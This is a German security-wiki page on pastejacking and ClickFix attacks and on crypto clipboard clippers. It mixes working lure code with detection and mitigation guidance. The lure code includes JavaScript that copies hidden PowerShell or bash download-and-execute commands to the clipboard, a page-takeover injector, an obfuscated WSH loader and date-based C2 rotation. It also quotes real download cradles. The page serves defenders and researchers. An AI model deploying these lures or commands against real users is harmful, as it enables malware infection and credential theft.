# Clipboard Hijacking (Pastejacking)-Angriffe

> „Füge niemals etwas ein, das du nicht selbst kopiert hast.“ – alter, aber immer noch gültiger Ratschlag

## Überblick

Clipboard hijacking – auch als *Pastejacking* bekannt – missbraucht die Tatsache, dass Benutzer regelmäßig Befehle kopieren und einfügen, ohne sie zu überprüfen. Eine bösartige Webseite (oder jeder JavaScript-fähige Kontext wie eine Electron- oder Desktop-Anwendung) platziert programmgesteuert vom Angreifer kontrollierten Text in der Systemzwischenablage. Die Opfer werden normalerweise durch sorgfältig formulierte Social-Engineering-Anweisungen dazu gebracht, **Win + R** (Dialog „Ausführen“), **Win + X** (Schnellzugriff / PowerShell) zu drücken oder ein Terminal zu öffnen und den Inhalt der Zwischenablage *einzufügen*, wodurch sofort beliebige Befehle ausgeführt werden.

Da **keine Datei heruntergeladen und kein Anhang geöffnet wird**, umgeht die Technik die meisten Sicherheitskontrollen für E-Mail- und Web-Inhalte, die Anhänge, Makros oder die direkte Befehlsausführung überwachen. Der Angriff ist daher bei Phishing-Kampagnen beliebt, die Commodity-Malware-Familien wie NetSupport RAT, den Latrodectus loader oder Lumma Stealer verbreiten.<sup>[[1]](#references)</sup>

## Clipper zum Ersetzen von Wallet-Adressen

Eine weitere Variante von **clipboard hijacking** fügt überhaupt keine Befehle ein: Sie wartet, bis das Opfer eine **Kryptowährungs-Wallet-Adresse** kopiert, und ersetzt sie dann unmittelbar vor dem Einfügen unbemerkt durch eine vom Angreifer kontrollierte Adresse. Dies ist besonders bei langen Wallet-Formaten effektiv, da Benutzer häufig nur die ersten und letzten Zeichen überprüfen.<sup>[[8]](#references)</sup>

Häufige Merkmale aus der Praxis:
- **Dünner loader + verschachteltes payload**: Die sichtbare App/EXE sieht wie ein legitimes Trading- oder „Profit“-Tool aus, während der eigentliche clipper tiefer im Bundle verborgen ist (beispielsweise ein .NET loader, der ein verschachteltes Rust payload startet).
- **Regex-gesteuerter Austausch**: Die Malware erkennt Zeichenfolgen wie `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` oder sogar generische **44 Zeichen lange Solana-ähnliche** Zeichenfolgen und schreibt sie in Wallet-Adressen des Angreifers um.
- **Wallet-Rotation im großen Maßstab**: Moderne Windows-Samples können **tausende** Ersatz-Wallets pro Währung einbetten, anstatt eine einzige statische Adresse zu verwenden. Dadurch wird der Verlust des Wallet-Rufs nach jedem Diebstahl reduziert.<sup>[[8]](#references)</sup>

### Windows-Clipper-Ablauf

Eine häufige Implementierung ist ein verborgenes Fenster, das mit **`AddClipboardFormatListener`** registriert wird. Bei jeder Aktualisierung der Zwischenablage ruft die Malware typischerweise Folgendes auf:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → Zugriff auf die aktuellen Zwischenablagedaten.
- **`GetClipboardData`** → Lesen des Textes.
- **`EmptyClipboard`** + **`SetClipboardData`** → Ersetzen der Wallet-Zeichenfolge durch den Wert des Angreifers.

Minimale Hunting-Regexes, die häufig in clippern zu finden sind:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Persistence auf Benutzerebene reicht für die Auswirkung aus. Ein beobachtetes Muster ist:<sup>[[8]](#references)</sup>
- Payload nach **`%APPDATA%\silke\silke.exe`** kopieren
- Einen **Startup-folder LNK** unter `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` erstellen

Erkennungsideen:
- Prozesse, die kontinuierlich Clipboard APIs aufrufen und gleichzeitig unter `%APPDATA%` sowie im **Startup**-Ordner des Benutzers schreiben.
- Erstellung neuer LNKs/ausführbarer Dateien, gefolgt von Clipboard-Umschreibungen von Wallet-Adressen.
- Archive oder Fake-Software-Bundles, die viele ungenutzte Dateien sowie einen kleinen Launcher enthalten, der eine verschachtelte Binary startet.

### Social-engineered Quarantine-Entfernung + LaunchAgent-Persistenz unter macOS

Unter macOS liefern manche Kampagnen einen **`unlocker.command`**-Helfer aus und weisen das Opfer an, per Rechtsklick → **Open** zu wählen, wenn Gatekeeper meldet, dass die App beschädigt sei oder von einem nicht identifizierten Entwickler stamme. Das Script entfernt lediglich die Quarantäne und startet die danebenliegende `.app`:<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Dies ist **kein** Gatekeeper-Exploit, sondern ein **durch Social Engineering herbeigeführter Quarantine-Bypass**, der die Tatsache ausnutzt, dass Gatekeeper-Entscheidungen vom `com.apple.quarantine`-xattr abhängen.<sup>[[8]](#references)</sup>

Nach der Ausführung kann der Clipper als aktueller Benutzer persistieren, indem er Folgendes schreibt:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – Wrapper-Skript
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent mit `RunAtLoad` und `KeepAlive`

Ein nützliches defensives Detail ist, dass einige Samples einen **Self-Healing-Watchdog** implementieren, der den LaunchAgent und den Wrapper etwa alle 30 Sekunden erneut schreibt. Wenn du zuerst die plist entfernst, **ohne den laufenden Prozess zu beenden**, kann die Malware sie sofort wiederherstellen.<sup>[[8]](#references)</sup> Sichere Reihenfolge für die Bereinigung:
1. Den aktiven Clipper-Prozess beenden.
2. Die LaunchAgent-plist entladen/löschen.
3. `~/launch.sh` und die kopierte Payload löschen.

### Hinweis zur Verbreitung: gefälschte Reputation als Kraftverstärker

Bei dieser Familie kann die Malware selbst technisch simpel bleiben, während die **Distribution Layer** die Hauptarbeit übernimmt: Gefälschte GitHub-Sterne/-Forks, SourceForge-Bewertungen/-Downloads, YouTube-Tutorial-Kommentare/-Aufrufe sowie harmlos wirkende VirusTotal-Kommentare/-Abstimmungen werden eingesetzt, um die Binary vor der Ausführung vertrauenswürdig erscheinen zu lassen.<sup>[[8]](#references)</sup>

## Erzwungene Copy-Buttons und versteckte Payloads (macOS One-Liner)

Einige macOS-Infostealer klonen Installer-Websites (z. B. Homebrew) und **erzwingen die Verwendung eines „Copy“-Buttons**, damit Benutzer nicht nur den sichtbaren Text markieren können. Der Clipboard-Eintrag enthält den erwarteten Installer-Befehl sowie eine angehängte Base64-Payload (z. B. `...; echo <b64> | base64 -d | sh`), sodass ein einziges Einfügen beides ausführt, während die UI die zusätzliche Stage verbirgt.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Ältere Kampagnen verwendeten `document.execCommand('copy')`, neuere setzen auf die asynchrone **Clipboard API** (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## The ClickFix / ClearFake Flow

1. Der Benutzer besucht eine typosquattete oder kompromittierte Website (z. B. `docusign.sa[.]com`)
2. Eingeschleiftes **ClearFake**-JavaScript ruft einen `unsecuredCopyToClipboard()`-Helper auf, der unbemerkt einen Base64-kodierten PowerShell-One-Liner in der Zwischenablage speichert.
3. HTML-Anweisungen fordern das Opfer auf: *„Drücken Sie **Win + R**, fügen Sie den Befehl ein und drücken Sie Enter, um das Problem zu beheben.“*
4. `powershell.exe` wird ausgeführt und lädt ein Archiv herunter, das eine legitime ausführbare Datei sowie eine bösartige DLL enthält (klassisches DLL sideloading).
5. Der Loader entschlüsselt zusätzliche Stages, injiziert Shellcode und installiert Persistence (z. B. eine geplante Aufgabe) – und führt letztendlich NetSupport RAT / Latrodectus / Lumma Stealer aus.<sup>[[1]](#references)</sup>

### Beispiel einer NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimes Java WebStart) durchsucht sein Verzeichnis nach `msvcp140.dll`.
* Die schädliche DLL löst APIs dynamisch mit **GetProcAddress** auf, lädt zwei Binärdateien (`data_3.bin`, `data_4.bin`) über **curl.exe** herunter, entschlüsselt sie mit einem rollierenden XOR-Schlüssel `"https://google.com/"`, injiziert den finalen Shellcode und entpackt **client32.exe** (NetSupport RAT) nach `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Lädt `la.txt` mit **curl.exe** herunter
2. Führt den JScript-Downloader innerhalb von **cscript.exe** aus
3. Ruft eine MSI-Payload ab → legt `libcef.dll` neben einer signierten Anwendung ab → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer über MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Der **mshta**-Aufruf startet ein verborgenes PowerShell-Skript, das `PartyContinued.exe` abruft, `Boat.pst` (CAB) extrahiert, `AutoIt3.exe` mittels `extrac32` und Dateiverkettung rekonstruiert und schließlich ein `.a3x`-Skript ausführt, das Browser-Zugangsdaten an `sumeriavgv.digital` exfiltriert.<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK mit rotierendem C2 (PureHVNC)

Einige ClickFix-Kampagnen verzichten vollständig auf Datei-Downloads und weisen Opfer stattdessen an, eine One-Liner-Befehlszeile einzufügen, die JavaScript über WSH abruft und ausführt, dessen Persistenz einrichtet und das C2 täglich rotiert. Beispiel einer beobachteten Kette:<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Wesentliche Merkmale
- Obfuscated URL wird zur Laufzeit umgekehrt, um eine beiläufige Prüfung zu umgehen.
- JavaScript persistiert sich über einen Startup LNK (WScript/CScript) und wählt den C2 anhand des aktuellen Tages aus – dadurch wird eine schnelle Domain-Rotation ermöglicht.<sup>[[3]](#references)</sup>

Minimales JS-Fragment zur Rotation der C2s anhand des Datums:<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Die nächste Phase setzt häufig einen Loader ein, der Persistenz etabliert und einen RAT (z. B. PureHVNC) nachlädt, wobei TLS oft an ein fest codiertes Zertifikat gebunden und der Traffic in Chunks aufgeteilt wird.<sup>[[3]](#references)</sup>

Spezifische Erkennungsideen für diese Variante
- Prozessbaum: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (oder `cscript.exe`).
- Startup-Artefakte: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, das WScript/CScript mit einem JS-Pfad unter `%TEMP%`/`%APPDATA%` aufruft.
- Registry/RunMRU- und Command-Line-Telemetrie mit `.split('').reverse().join('')` oder `eval(a.responseText)`.
- Wiederholtes `powershell -NoProfile -NonInteractive -Command -` mit großen stdin-Payloads, um lange Skripte ohne lange Command Lines zu übergeben.
- Scheduled Tasks, die anschließend LOLBins wie `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` unter einem nach Updater aussehenden Task/Pfad ausführen (z. B. `\GoogleSystem\GoogleUpdater`).

Threat Hunting
- Täglich wechselnde C2-Hostnamen und URLs mit dem Muster `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Clipboard-Schreibereignisse korrelieren, auf die ein Win+R-Paste und anschließend sofort die Ausführung von `powershell.exe` folgt.

Blue-Teams können Clipboard-, Process-Creation- und Registry-Telemetrie kombinieren, um Pastejacking-Missbrauch zu identifizieren:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` speichert einen Verlauf der **Win + R**-Befehle – achten Sie auf ungewöhnliche Base64-/obfuskierte Einträge.
* Security Event ID **4688** (Process Creation), bei dem `ParentImage` == `explorer.exe` und `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } enthalten ist.
* Event ID **4663** für Dateierstellungen unter `%LocalAppData%\Microsoft\Windows\WinX\` oder in temporären Ordnern unmittelbar vor dem verdächtigen 4688-Event.
* EDR-Clipboard-Sensoren (falls vorhanden) – `Clipboard Write` korrelieren, auf die unmittelbar ein neuer PowerShell-Prozess folgt.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Aktuelle Kampagnen produzieren in großem Maßstab gefälschte CDN-/Browser-Verifizierungsseiten („Just a moment…“, IUAM-style), die Nutzer dazu bringen, betriebssystemspezifische Befehle aus ihrer Clipboard in native Consoles zu kopieren. Dadurch wird die Ausführung aus der Browser-Sandbox verlagert, und der Ansatz funktioniert unter Windows und macOS.<sup>[[4]](#references)</sup>

Wesentliche Merkmale der builder-generierten Seiten
- OS-Erkennung über `navigator.userAgent`, um die Payloads anzupassen (Windows PowerShell/CMD gegenüber macOS Terminal). Optionale Decoys/No-ops für nicht unterstützte Betriebssysteme, um die Illusion aufrechtzuerhalten.
- Automatisches Kopieren in die Clipboard bei harmlosen UI-Aktionen (Checkbox/Copy), während der sichtbare Text vom Clipboard-Inhalt abweichen kann.
- Blockierung von Mobilgeräten und ein Popover mit Schritt-für-Schritt-Anweisungen: Windows → Win+R→paste→Enter; macOS → Terminal öffnen→paste→Enter.
- Optionale Obfuscation und ein Single-File-Injector, der das DOM einer kompromittierten Website mit einer Tailwind-gestylten Verifizierungs-UI überschreibt (keine neue Domain-Registrierung erforderlich).<sup>[[4]](#references)</sup>

Beispiel: Clipboard-Mismatch + OS-aware Branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
Persistenz der ersten Ausführung unter macOS
- Verwende `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`, damit die Ausführung nach dem Schließen des Terminals fortgesetzt wird und weniger sichtbare Spuren hinterlässt.<sup>[[4]](#references)</sup>

Übernahme von Seiten direkt auf kompromittierten Websites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Erkennungs- und Hunting-Ideen speziell für IUAM-ähnliche Köder
- Web: Seiten, die die Clipboard API an Verifizierungs-Widgets binden; Abweichung zwischen angezeigtem Text und Clipboard-Inhalt; Verzweigungen über `navigator.userAgent`; Tailwind + Single-Page-Ersetzung in verdächtigen Kontexten.
- Windows-Endpunkt: `explorer.exe` → `powershell.exe`/`cmd.exe` kurz nach einer Browser-Interaktion; aus `%TEMP%` ausgeführte Batch-/MSI-Installer.
- macOS-Endpunkt: Terminal/iTerm startet `bash`/`curl`/`base64 -d` mit `nohup` in zeitlicher Nähe zu Browser-Ereignissen; Hintergrundprozesse, die das Schließen des Terminals überleben.
- `RunMRU`-Win+R-Verlauf und Clipboard-Schreibvorgänge mit der anschließenden Erstellung von Konsolenprozessen korrelieren.

Siehe auch unterstützende Techniken

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake kompromittiert weiterhin WordPress-Websites und injiziert Loader-JavaScript, das externe Hosts (Cloudflare Workers, GitHub/jsDelivr) miteinander verkettet und sogar Blockchain-„etherhiding“-Aufrufe verwendet (z. B. POSTs an Binance Smart Chain API-Endpunkte wie `bsc-testnet.drpc[.]org`), um die aktuelle Köderlogik abzurufen. Bei neueren Overlays kommen häufig fake CAPTCHAs zum Einsatz, die Nutzer anweisen, eine einzeilige Eingabe zu kopieren und einzufügen (T1204.004), anstatt etwas herunterzuladen.<sup>[[6]](#references)</sup>
- Die initiale Ausführung wird zunehmend an signierte Script-Hosts/LOLBAS delegiert. Bei Chains im Januar 2026 wurde die frühere Verwendung von `mshta` durch den integrierten, über `WScript.exe` ausgeführten `SyncAppvPublishingServer.vbs` ersetzt, wobei PowerShell-ähnliche Argumente mit Aliases/Wildcards übergeben wurden, um entfernte Inhalte abzurufen:<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` ist signiert und wird normalerweise von App-V verwendet; zusammen mit `WScript.exe` und ungewöhnlichen Argumenten (`gal`-/`gcm`-Aliase, Cmdlets mit Wildcards, jsDelivr-URLs) wird es zu einer deutlich erkennbaren LOLBAS-Stufe für ClearFake.<sup>[[6]](#references)</sup>
- Gefälschte CAPTCHA-Payloads wechselten im Februar 2026 wieder zu reinen PowerShell-Download-Cradles. Zwei aktive Beispiele:<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Die erste Chain ist ein In-Memory-`iex(irm ...)`-Grabber; die zweite verwendet `WinHttp.WinHttpRequest.5.1`, schreibt eine temporäre `.ps1`-Datei und startet sie anschließend mit `-ep bypass` in einem versteckten Fenster.<sup>[[6]](#references)</sup>

Erkennungs-/Hunting-Tipps für diese Varianten
- Prozessabstammung: Browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` oder PowerShell-Cradles unmittelbar nach Clipboard-Schreibvorgängen/Win+R.
- Schlüsselwörter in der Befehlszeile: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr-/GitHub-/Cloudflare-Worker-Domains oder Raw-IP-`iex(irm ...)`-Muster.
- Netzwerk: Ausgehende Verbindungen zu CDN-Worker-Hosts oder Blockchain-RPC-Endpunkten von Script-Hosts oder PowerShell kurz nach dem Web-Browsing.
- Dateien/Registry: Erstellen temporärer `.ps1`-Dateien unter `%TEMP%` sowie RunMRU-Einträge mit diesen One-Linern; bei signierten Script-LOLBAS (WScript/cscript/mshta), die mit externen URLs oder obfuskierten Alias-Strings ausgeführt werden, blockieren bzw. alarmieren.

## ClickFix-Taktiken im Juni 2026: Paste-Telemetrie, gefälschte Verifikationskommentare und LOLBin-Chaining

Aktuelle Telemetrie von Red Canary zeigt, dass der stabile Indikator **nicht ein einzelner exakter Befehl**, sondern die Kombination aus **benutzerunterstütztem Paste-and-Run**, **vertrauenswürdigen Interpretern/LOLBins**, **obfuskierten Flags**, **Remote-Abruf** und **sofortiger Ausführung** ist.<sup>[[7]](#references)</sup>

### Bemerkenswerte Operator-Muster

- **Paste-Bestätigungstelemetrie**: Einige Payloads rufen vor der eigentlichen Stage `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` auf. Dadurch wird die Benutzerinteraktion bestätigt, während das Fenster kurz und unauffällig bleibt.
- **Gefälschte Verifikationskommentare**: PowerShell-One-Liner können Strings wie `# Security check ✔️ I'm not a robot Verification ID: 138105` anhängen, sodass der Befehl nach dem Einfügen in Run / `cmd.exe` / die PowerShell-Historie weiterhin CAPTCHA-bezogen wirkt.
- **Dynamische URL-Rekonstruktion**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` vermeidet eine statische URL in der Befehlszeile und führt dennoch einen In-Memory-Download-and-Execute aus.
- **Verschleierte Installer-Ausführung**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` missbraucht ungewöhnliche Groß-/Kleinschreibung und Unicode-ähnliche Zeichen in Flags, um fragile Erkennungen zu umgehen und weiterhin wie `msiexec.exe` auszusehen.
- **Caret-escaped LOLBin-Chains**: `cmd.exe` kann Schlüsselwörter mit `^`-Escapes verbergen (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), die verschachtelte Shell minimiert starten, Angreiferinhalte mit einer harmlosen Erweiterung wie `.pdf` speichern und sie anschließend über `mshta` ausführen.<sup>[[7]](#references)</sup>
## Mitigations

1. Browser-Härtung – Clipboard-Schreibzugriff deaktivieren (`dom.events.asyncClipboard.clipboardItem` usw.) oder eine Benutzeraktion voraussetzen.
2. Security Awareness – Benutzer anweisen, sensible Befehle zu *tippen* oder sie zunächst in einen Texteditor einzufügen.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control, um beliebige One-Liner zu blockieren.
4. Netzwerk-Kontrollen – ausgehende Anfragen an bekannte Pastejacking- und Malware-C2-Domains blockieren.

## Verwandte Tricks

* **Discord Invite Hijacking** missbraucht häufig denselben ClickFix-Ansatz, nachdem Benutzer in einen bösartigen Server gelockt wurden:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [1] [ClickFix verhindern: Verhindern des ClickFix-Angriffsvektors](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Under the Pure Curtain: Von RAT zu Builder zu Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [Die ClickFix-Fabrik: Erste Veröffentlichung des IUAM-ClickFix-Generators](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, das Jahr des Infostealers](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: Februar 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: Juni 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Von Sternen zu Upvotes: Gefälschte Reputation als Treibstoff für einen Crypto-Clipboard-Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
